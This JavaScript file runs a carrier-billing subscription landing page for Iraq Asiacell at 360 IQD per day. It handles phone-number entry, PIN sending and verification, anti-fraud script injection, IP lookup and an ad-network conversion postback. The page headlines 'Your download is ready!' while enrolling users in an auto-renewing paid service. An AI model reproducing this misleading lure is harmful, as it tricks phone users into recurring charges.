(function () {
  "use strict";

  /**
   * Iraq Asiacell — FunPlus / Gamifya (cid=200) IQAGcmp
   * 360 IQD/day — unsub 0 → 2162 — PIN 4
   * AF: antifraud-vms.iraqcom.com ChannelID=22796 (Page=1 MSISDN, Page=2 OTP)
   * PropellerAds: visitor_id=${SUBID} payout=360
   * UI: FunPlus Step 1/2 (download-ready)
   */

  var msisdnFormat = /^77[0-9]{8}$/;
  var COUNTRY = "964";
  var PIN_LENGTH = 4;
  var CID = "200";
  var PAYOUT = "360";
  var API_BASE = "http://143.198.213.74/prod/IQAGcmp";

  var useProxy =
    typeof location !== "undefined" &&
    location.protocol !== "file:" &&
    (location.protocol === "http:" || location.protocol === "https:");

  var POSTBACK = {
    url: "https://ad.propellerads.com/conversion.php",
    aid: "3898869",
    pid: "",
    tid: "154120"
  };

  function persist(k, v) {
    if (v == null || v === "") return;
    try { sessionStorage.setItem(k, v); } catch (e) {}
    try { localStorage.setItem(k, v); } catch (e2) {}
  }

  function track(k) {
    try {
      var v = sessionStorage.getItem(k);
      if (v) return v;
    } catch (e) {}
    try { return localStorage.getItem(k) || ""; } catch (e2) { return ""; }
  }

  function isRealClickId(v) {
    if (!v) return false;
    var s = String(v).trim();
    if (!s) return false;
    var low = s.toLowerCase();
    if (s.indexOf("local_") === 0) return false;
    if (low === "clickid" || low === "subid" || low === "visitor_id") return false;
    if (s.indexOf("{") !== -1 || s.indexOf("${") !== -1) return false;
    return true;
  }

  function normalizeLocal(raw) {
    var digits = String(raw || "").replace(/\D/g, "");
    if (digits.indexOf(COUNTRY) === 0) digits = digits.slice(COUNTRY.length);
    if (digits.charAt(0) === "0") digits = digits.slice(1);
    return digits.slice(0, 10);
  }

  function fullMsisdn(local) {
    return COUNTRY + normalizeLocal(local);
  }

  function initTracking() {
    var params = new URLSearchParams(window.location.search);
    var clickId =
      params.get("clickid") ||
      params.get("click_id") ||
      params.get("subid") ||
      params.get("token") ||
      "";
    if (isRealClickId(clickId)) persist("click_id", clickId);

    ["pub_id", "sub_pub_id", "sessionKey", "user_ip", "zoneid"].forEach(function (k) {
      var v = params.get(k);
      if (v && String(v).indexOf("{") === -1 && String(v).indexOf("$") === -1) persist(k, v);
    });

    var uniq = params.get("uniqid") || params.get("mcpuniqid") || "";
    if (uniq) persist("mcp_uniqid", uniq);
    var af1 = params.get("antifraudUniqId") || params.get("antifrauduniqid") || "";
    if (af1) persist("asiacell_af_id", af1);
    var ms = params.get("MSISDN") || params.get("msisdn") || "";
    if (ms) {
      var local = normalizeLocal(ms);
      if (local) {
        persist("phone", local);
        persist("msisdn", COUNTRY + local);
      }
    }

    if (!track("pub_id")) persist("pub_id", "propeller");
    if (!track("sub_pub_id")) {
      var zone = params.get("zoneid") || params.get("zone_id") || "0";
      if (zone && String(zone).indexOf("{") === -1) persist("sub_pub_id", "ZONE" + zone);
    }
  }

  function getClickId() {
    var existing = track("click_id");
    if (isRealClickId(existing)) return existing;
    var fallback = track("zeen_click_id");
    if (fallback) return fallback;
    fallback = "local_" + Date.now();
    persist("zeen_click_id", fallback);
    return fallback;
  }

  function getVisitorId() {
    var existing = track("click_id");
    return isRealClickId(existing) ? existing : "";
  }

  function getUserIp(cb) {
    if (track("user_ip")) { cb(track("user_ip")); return; }
    var done = false;
    function finish(ip) {
      if (done) return;
      done = true;
      if (ip) persist("user_ip", ip);
      cb(ip || "");
    }
    var t = setTimeout(function () { finish(""); }, 2500);
    fetch("https://api.ipify.org?format=json")
      .then(function (r) { return r.json(); })
      .then(function (d) { clearTimeout(t); finish((d && d.ip) || ""); })
      .catch(function () { clearTimeout(t); finish(""); });
  }

  function injectScript(src) {
    if (!src) return;
    try {
      var s = document.createElement("script");
      s.type = "text/javascript";
      s.text = src;
      (document.head || document.documentElement).appendChild(s);
    } catch (e) {}
  }

  function fetchJson(url) {
    return fetch(url, { method: "GET", credentials: "omit", cache: "no-store" }).then(function (res) {
      return res.text().then(function (text) {
        if (/^\s*<\?php/i.test(text)) throw { msg: "php" };
        try { return JSON.parse(text); }
        catch (e) { throw { msg: "x", raw: text }; }
      });
    });
  }

  function apiUrl(path, params) {
    var q = new URLSearchParams(params || {});
    if (useProxy) {
      q.set("path", path);
      return "iq-api.php?" + q.toString();
    }
    return API_BASE + "/" + path + "?" + q.toString();
  }

  function callApi(path, params) {
    return fetchJson(apiUrl(path, params));
  }

  function isOk(resp) {
    if (!resp) return false;
    var r = String(resp.response || "").toUpperCase();
    if (r === "SUCCESS" || r === "ACTIVE") return true;
    var m = String(resp.errorMessage || resp.msg || "").toLowerCase();
    return /success|otp sent|otp verified|active/.test(m);
  }

  function errMsg(resp) {
    return String((resp && (resp.errorMessage || resp.msg || resp.message)) || "");
  }

  function portalUrl(msisdn) {
    return API_BASE + "/redirect?cid=" + CID + "&msisdn=" + encodeURIComponent(msisdn);
  }

  function loadAfPage1(done) {
    var url = "asiacell-af.php?page=1&clickid=" + encodeURIComponent(getClickId());
    fetchJson(url)
      .then(function (data) {
        if (data && data.script) injectScript(data.script);
        if (data && data.antifrauduniqid) persist("asiacell_af_id", data.antifrauduniqid);
        if (data && data.mcpuniqid) persist("mcp_uniqid", data.mcpuniqid);
        if (done) done(null, data);
      })
      .catch(function (err) {
        if (done) done(err || { msg: "af" });
      });
  }

  function loadAfPage2(msisdn, done) {
    var url =
      "asiacell-af.php?page=2&clickid=" + encodeURIComponent(getClickId()) +
      "&msisdn=" + encodeURIComponent(msisdn || "");
    fetchJson(url)
      .then(function (data) {
        if (data && data.script) injectScript(data.script);
        if (data && data.antifrauduniqid) persist("asiacell_af_otp", data.antifrauduniqid);
        if (data && data.mcpuniqid) persist("mcp_uniqid", data.mcpuniqid);
        if (done) done(null, data);
      })
      .catch(function (err) {
        if (done) done(err || { msg: "af" });
      });
  }

  function setOtpUrlParams(msisdn) {
    try {
      var url = new URL(window.location.href);
      url.searchParams.set("uniqid", track("mcp_uniqid") || "");
      url.searchParams.set("MSISDN", msisdn || "");
      window.history.replaceState({}, "", url);
    } catch (e) {}
  }

  function firePostback(done) {
    var clickId = getVisitorId();
    var once = false;
    function finish(ok) {
      if (once) return;
      once = true;
      if (typeof done === "function") done(ok);
    }
    if (!clickId) { finish(false); return; }

    var qs =
      "aid=" + encodeURIComponent(POSTBACK.aid) +
      "&pid=" + encodeURIComponent(POSTBACK.pid) +
      "&tid=" + encodeURIComponent(POSTBACK.tid) +
      "&visitor_id=" + encodeURIComponent(clickId) +
      "&payout=" + encodeURIComponent(PAYOUT);
    var direct = POSTBACK.url + "?" + qs;
    var proxy = "propeller-pb.php?visitor_id=" + encodeURIComponent(clickId) + "&payout=" + encodeURIComponent(PAYOUT);

    try { var img = new Image(); img.src = direct + "&_t=" + Date.now(); } catch (e) {}
    try { fetch(direct, { method: "GET", mode: "no-cors", keepalive: true }).catch(function () {}); } catch (e2) {}
    if (navigator.sendBeacon) { try { navigator.sendBeacon(proxy); } catch (e3) {} }

    if (useProxy) {
      fetch(proxy, { method: "GET", keepalive: true })
        .then(function (r) { finish(r.ok); })
        .catch(function () { finish(true); });
    } else {
      setTimeout(function () { finish(true); }, 800);
      return;
    }
    setTimeout(function () { finish(true); }, 4000);
  }

  var lang = "en";
  var t = {
    en: {
      langSwitch: "العربية",
      step1: "STEP 1/2",
      step2: "STEP 2/2",
      heroTitle: "Your download is ready!",
      subscribeBtn: "SUBSCRIBE",
      confirmBtn: "CONFIRM",
      pinTitle: "Enter PIN code",
      pinHint: "A 4-digit PIN has been sent to your phone.",
      wrongNumber: "Wrong number?",
      termsLink: "Terms",
      privacyLink: "Privacy",
      disclaimer:
        "Asiacell: 360 IQD per day. This service renews automatically. To cancel, send 0 to 2162.",
      errmsg: {
        m: "Please enter your mobile number",
        o: "Please enter a valid Asiacell number (10 digits starting with 77).",
        p: "Please enter the 4-digit PIN",
        af: "Security check loading. Please try again.",
        "1001": "PIN could not be sent. Please try again.",
        "1004": "Invalid or expired PIN. Please try again.",
        x: "Connection error. Please try again.",
        php: "PHP is not enabled. Ask hosting to enable PHP."
      }
    },
    ar: {
      langSwitch: "English",
      step1: "الخطوة 1/2",
      step2: "الخطوة 2/2",
      heroTitle: "التحميل جاهز!",
      subscribeBtn: "اشترك",
      confirmBtn: "تأكيد",
      pinTitle: "أدخل رمز PIN",
      pinHint: "تم إرسال رمز PIN المكون من 4 أرقام إلى هاتفك.",
      wrongNumber: "رقم خاطئ؟",
      termsLink: "الشروط",
      privacyLink: "الخصوصية",
      disclaimer:
        "آسياسيل: 360 دينار عراقي يومياً. تتجدد الخدمة تلقائياً. للإلغاء أرسل 0 إلى 2162.",
      errmsg: {
        m: "الرجاء إدخال رقم الجوال",
        o: "يرجى إدخال رقم آسياسيل صحيح (10 أرقام يبدأ بـ 77).",
        p: "الرجاء إدخال رمز PIN المكون من 4 أرقام",
        af: "جاري تحميل الحماية. حاول مرة أخرى.",
        "1001": "تعذر إرسال PIN. حاول مرة أخرى.",
        "1004": "رمز PIN غير صحيح أو منتهي.",
        x: "خطأ في الاتصال. يرجى المحاولة مرة أخرى.",
        php: "PHP غير مفعل على الخادم."
      }
    }
  };

  function errText(key) {
    return (t[lang].errmsg && t[lang].errmsg[key]) || t.en.errmsg[key] || "";
  }

  function applyLang() {
    var dict = t[lang] || t.en;
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === "ar" ? "rtl" : "ltr";
    document.querySelectorAll("[data-i18n]").forEach(function (el) {
      var key = el.getAttribute("data-i18n");
      if (dict[key] != null) el.textContent = dict[key];
    });
    document.querySelectorAll("[data-i18n-html]").forEach(function (el) {
      var key = el.getAttribute("data-i18n-html");
      if (dict[key] != null) el.textContent = dict[key];
    });
    var onPin = document.getElementById("vcode_div") &&
      !document.getElementById("vcode_div").classList.contains("hide");
    var stepLabel = document.getElementById("stepLabel");
    if (stepLabel) stepLabel.textContent = onPin ? dict.step2 : dict.step1;
    try { localStorage.setItem("lang", lang); } catch (e) {}
  }

  function showError(msg, id) {
    var box = document.getElementById(id || "errortext") || document.getElementById("errortext2");
    if (box) box.textContent = msg || "";
  }

  function setLoading(on) {
    var btn1 = document.getElementById("btn-1");
    var verify = document.getElementById("verifybtn");
    if (on) {
      if (btn1) { btn1.classList.add("btn-loading"); btn1.disabled = true; }
      if (verify) { verify.classList.add("btn-loading"); verify.disabled = true; }
    } else {
      if (btn1) btn1.classList.remove("btn-loading");
      if (verify) verify.classList.remove("btn-loading");
    }
  }

  function showPinStep() {
    var otp = document.getElementById("otp_div");
    var pin = document.getElementById("vcode_div");
    if (otp) {
      otp.classList.remove("active");
      otp.classList.add("hide");
    }
    if (pin) {
      pin.classList.remove("hide");
      pin.classList.add("active");
    }
    var fill = document.getElementById("progressFill");
    if (fill) fill.style.width = "100%";
    var dict = t[lang] || t.en;
    var stepLabel = document.getElementById("stepLabel");
    if (stepLabel) stepLabel.textContent = dict.step2;
  }

  function openModal(id) {
    var src = document.getElementById(id);
    var box = document.getElementById("displayiframe");
    var modal = document.getElementById("myModal");
    if (!src || !box || !modal) return;
    box.innerHTML = src.innerHTML;
    modal.classList.add("show");
    modal.setAttribute("aria-hidden", "false");
    document.body.style.overflow = "hidden";
  }

  function closeModal() {
    var modal = document.getElementById("myModal");
    if (!modal) return;
    modal.classList.remove("show");
    modal.setAttribute("aria-hidden", "true");
    document.body.style.overflow = "";
  }

  initTracking();
  getUserIp(function () {});
  getClickId();

  var qLang = new URLSearchParams(window.location.search).get("lang");
  if (qLang === "ar" || qLang === "en") lang = qLang;
  else {
    try { lang = localStorage.getItem("lang") || "en"; } catch (e) { lang = "en"; }
  }
  applyLang();

  var langToggle = document.getElementById("langToggle");
  if (langToggle) {
    langToggle.addEventListener("click", function () {
      lang = lang === "en" ? "ar" : "en";
      applyLang();
      var url = new URL(window.location.href);
      url.searchParams.set("lang", lang);
      window.history.replaceState({}, "", url);
    });
  }

  document.querySelectorAll("[data-open]").forEach(function (a) {
    a.addEventListener("click", function (e) {
      e.preventDefault();
      var which = a.getAttribute("data-open");
      openModal(which === "privacy" ? "privacy-fetched-content" : "terms-fetched-content");
    });
  });
  var closeBtn = document.getElementById("closeModal");
  if (closeBtn) closeBtn.addEventListener("click", closeModal);
  var modal = document.getElementById("myModal");
  if (modal) {
    modal.addEventListener("click", function (e) {
      if (e.target === modal) closeModal();
    });
  }

  var mForm = document.getElementById("msisdnForm");
  if (mForm) {
    loadAfPage1(function () {});

    var mInput = document.getElementById("phone");
    var submitBtn = document.getElementById("btn-1");
    var phoneField = document.getElementById("phoneField");

    function refreshMsisdnBtn() {
      var value = normalizeLocal(mInput.value);
      var ok = msisdnFormat.test(value);
      if (!submitBtn.classList.contains("btn-loading")) submitBtn.disabled = !ok;
      if (phoneField) {
        if (ok) phoneField.classList.add("valid");
        else phoneField.classList.remove("valid");
      }
      return { value: value, ok: ok };
    }

    mInput.addEventListener("input", function () {
      mInput.value = normalizeLocal(mInput.value);
      showError("");
      refreshMsisdnBtn();
    });
    refreshMsisdnBtn();

    mForm.addEventListener("submit", function (e) {
      e.preventDefault();
      var state = refreshMsisdnBtn();
      if (!state.value) { showError(errText("m")); return; }
      if (!state.ok) { showError(errText("o")); return; }
      showError("");
      setLoading(true);

      var msisdn = fullMsisdn(state.value);
      persist("msisdn", msisdn);
      persist("phone", state.value);

      function doSend() {
        var sk = track("asiacell_af_id");
        if (!sk) {
          setLoading(false);
          refreshMsisdnBtn();
          showError(errText("af"));
          return;
        }
        getUserIp(function (ip) {
          callApi("sendPIN", {
            cid: CID,
            msisdn: msisdn,
            ip: ip || track("user_ip") || "0.0.0.0",
            sessionKey: sk
          })
            .then(function (resp) {
              setLoading(false);
              refreshMsisdnBtn();
              if (!isOk(resp)) {
                showError(errMsg(resp) || errText("1001"));
                return;
              }
              setOtpUrlParams(msisdn);
              showPinStep();
              loadAfPage2(msisdn, function () {});
              var pinEl = document.getElementById("pincode");
              if (pinEl) { pinEl.value = ""; pinEl.focus(); }
              document.getElementById("verifybtn").disabled = true;
            })
            .catch(function (err) {
              setLoading(false);
              refreshMsisdnBtn();
              showError(errText((err && err.msg) || "x"));
            });
        });
      }

      if (!track("asiacell_af_id")) {
        loadAfPage1(function () { doSend(); });
      } else {
        doSend();
      }
    });
  }

  var pForm = document.getElementById("pinForm");
  if (pForm) {
    var pInput = document.getElementById("pincode");
    var confirmBtn = document.getElementById("verifybtn");
    var errId = "errortext2";

    function ensurePinAf(cb) {
      if (track("asiacell_af_otp")) { cb(true); return; }
      var ms = track("msisdn") || (track("phone") ? COUNTRY + track("phone") : "");
      if (!ms) { cb(false); return; }
      loadAfPage2(ms, function (err) {
        cb(!err && !!track("asiacell_af_otp"));
      });
    }

    pInput.addEventListener("input", function () {
      pInput.value = String(pInput.value || "").replace(/\D/g, "").slice(0, PIN_LENGTH);
      confirmBtn.disabled = pInput.value.length !== PIN_LENGTH;
      showError("", errId);
    });

    var wrong = document.getElementById("wrongNumber");
    if (wrong) {
      wrong.addEventListener("click", function (e) {
        e.preventDefault();
        window.location.reload();
      });
    }

    pForm.addEventListener("submit", function (e) {
      e.preventDefault();
      var otp = String(pInput.value || "").replace(/\D/g, "");
      if (otp.length !== PIN_LENGTH) {
        showError(errText("p"), errId);
        return;
      }
      showError("", errId);
      setLoading(true);

      ensurePinAf(function (ok) {
        if (!ok) {
          setLoading(false);
          confirmBtn.disabled = false;
          showError(errText("af"), errId);
          return;
        }
        getUserIp(function (ip) {
          var msisdn = track("msisdn") || (track("phone") ? COUNTRY + track("phone") : "");
          callApi("verifyPIN", {
            cid: CID,
            msisdn: msisdn,
            pin: otp,
            ip: ip || track("user_ip") || "0.0.0.0",
            sessionKey: track("asiacell_af_otp")
          })
            .then(function (resp) {
              if (!isOk(resp)) {
                setLoading(false);
                confirmBtn.disabled = false;
                showError(errMsg(resp) || errText("1004"), errId);
                return;
              }
              persist("converted", "1");
              persist("portal_url", portalUrl(msisdn));
              persist("pb_amount", PAYOUT);
              firePostback(function () {
                window.location.href = "thankyou.html?lang=" + lang;
              });
            })
            .catch(function (err) {
              setLoading(false);
              confirmBtn.disabled = false;
              showError(errText((err && err.msg) || "x"), errId);
            });
        });
      });
    });
  }

  window.onpageshow = function (event) {
    if (event.persisted) window.location.reload();
  };
})();
